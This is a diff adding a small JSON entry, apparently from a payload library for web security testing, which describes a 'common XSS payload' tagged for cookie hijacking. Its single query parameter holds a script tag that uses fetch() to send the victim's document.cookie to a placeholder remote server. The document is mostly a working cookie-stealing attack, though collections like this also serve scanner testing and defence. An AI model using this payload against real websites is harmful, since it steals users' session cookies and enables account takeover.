@@ -1,0 +1,15 @@
+{
+"categories":["XSS","CSRF"],
+"tags": ["xss","javascript","alert","fetch","cookie","hijacking","cookie hijacking","reflected"],
+"description":"common XSS payload",
+"payload":
+    {
+    "method":"GET",
+    "headers":{},
+    "body":{},
+    "query":
+        {
+        "q":"<script>fetch('http://remote.server:1234/'+document.cookie)</script>"
+        }
+    }
+}
